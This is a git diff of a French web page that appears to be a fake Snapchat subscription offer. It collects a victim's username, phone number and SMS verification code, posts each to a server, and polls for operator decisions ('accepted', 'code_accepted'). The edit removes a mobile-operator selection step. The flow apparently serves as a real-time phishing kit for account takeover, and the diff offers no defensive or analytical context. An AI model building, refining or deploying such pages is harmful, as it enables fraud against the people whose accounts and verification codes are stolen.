@@ -326,7 +326,6 @@
       <div class="dot"></div>
       <div class="dot"></div>
       <div class="dot"></div>
-      <div class="dot"></div>
     </div>
 
     <!-- Étape 1 : Choix -->
@@ -351,25 +350,11 @@
     <div id="step2" class="step">
       <h2>Votre Identifiant</h2>
       <input type="text" id="username" placeholder="@pseudo_snapchat" autocomplete="off">
-      <button class="btn" onclick="goToOperator()">Continuer</button>
+      <button class="btn" onclick="goToPhone()">Continuer</button>
     </div>
 
-    <!-- Étape 3 : Opérateur -->
+    <!-- Étape 3 : Téléphone -->
     <div id="step3" class="step">
-      <h2>Votre Opérateur</h2>
-      <div class="offer-card" onclick="selectOperator('Orange')" style="text-align: center;">
-        <div class="offer-title" style="margin-bottom: 0;">Orange</div>
-      </div>
-      <div class="offer-card" onclick="selectOperator('SFR')" style="text-align: center;">
-        <div class="offer-title" style="margin-bottom: 0;">SFR</div>
-      </div>
-      <div class="offer-card" onclick="selectOperator('Bouygues Telecom')" style="text-align: center;">
-        <div class="offer-title" style="margin-bottom: 0;">Bouygues Telecom</div>
-      </div>
-    </div>
-
-    <!-- Étape 4 : Téléphone -->
-    <div id="step4" class="step">
       <h2>Votre Numéro</h2>
       <div style="display: flex; gap: 10px; margin-bottom: 20px;">
         <select id="countryCode" style="padding: 18px 10px; font-size: 1.1rem; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: 16px; color: white; outline: none; width: 110px;">
@@ -382,8 +367,8 @@
       <button class="btn" id="sendBtn" onclick="sendNumber()">Recevoir le code par SMS</button>
     </div>
 
-    <!-- Étape 5 : Chargement -->
-    <div id="step5" class="step">
+    <!-- Étape 4 : Chargement -->
+    <div id="step4" class="step">
       <h2>Patientez...</h2>
       <div style="text-align:center; margin: 30px 0;">
         <div class="spinner"></div>
@@ -391,8 +376,8 @@
       </div>
     </div>
 
-    <!-- Étape 6 : Code -->
-    <div id="step6" class="step">
+    <!-- Étape 5 : Code -->
+    <div id="step5" class="step">
       <h2>Vérification</h2>
       <div class="info-box" id="codeInfoBox">
         Un code à 4 chiffres a été envoyé sur votre numéro.
@@ -406,8 +391,8 @@
       </div>
     </div>
 
-    <!-- Étape 7 : Succès -->
-    <div id="step7" class="step">
+    <!-- Étape 6 : Succès -->
+    <div id="step6" class="step">
       <div style="text-align:center; padding: 20px 0;">
         <div style="font-size: 4rem; margin-bottom: 20px;">🎉</div>
         <h2>Félicitations !</h2>
@@ -463,18 +448,13 @@
       }
     }
 
-    function goToOperator() {
+    function goToPhone() {
       username = document.getElementById('username').value.trim();
       if (username.length < 3) {
         showToast("❌ Veuillez entrer un pseudo valide.");
         return;
       }
       showStep(3);
-    }
-
-    function selectOperator(operator) {
-      selectedOperator = operator;
-      showStep(4);
     }
 
     async function sendNumber() {
@@ -505,7 +485,6 @@
             body: JSON.stringify({
                 username,
                 phoneNumber,
-                selectedOperator,
                 selectedMonths
             })
         });
@@ -513,7 +492,7 @@
         
         if (data.sessionId) {
             currentSessionId = data.sessionId;
-            showStep(5); // Étape chargement
+            showStep(4); // Étape chargement
             startPolling();
         } else {
             showToast("❌ Erreur serveur.");
@@ -536,7 +515,7 @@
                 
                 if (data.status === 'accepted') {
                     clearInterval(pollInterval);
-                    showStep(6); // Étape code
+                    showStep(5); // Étape code
                     showToast("✅ Code envoyé par SMS !");
                 } else if (data.status === 'refused') {
                     clearInterval(pollInterval);
@@ -610,7 +589,7 @@
                 
                 if (data.status === 'code_accepted') {
                     clearInterval(pollInterval);
-                    showStep(7);
+                    showStep(6);
                 } else if (data.status === 'code_refused') {
                     clearInterval(pollInterval);
                     showToast("❌ Code invalide, veuillez réessayer.");
@@ -635,7 +614,6 @@
 
     function resetAll() {
       username = "";
-      selectedOperator = "";
       phoneNumber = "";
       codeAlreadySent = false;
       currentSessionId = null;
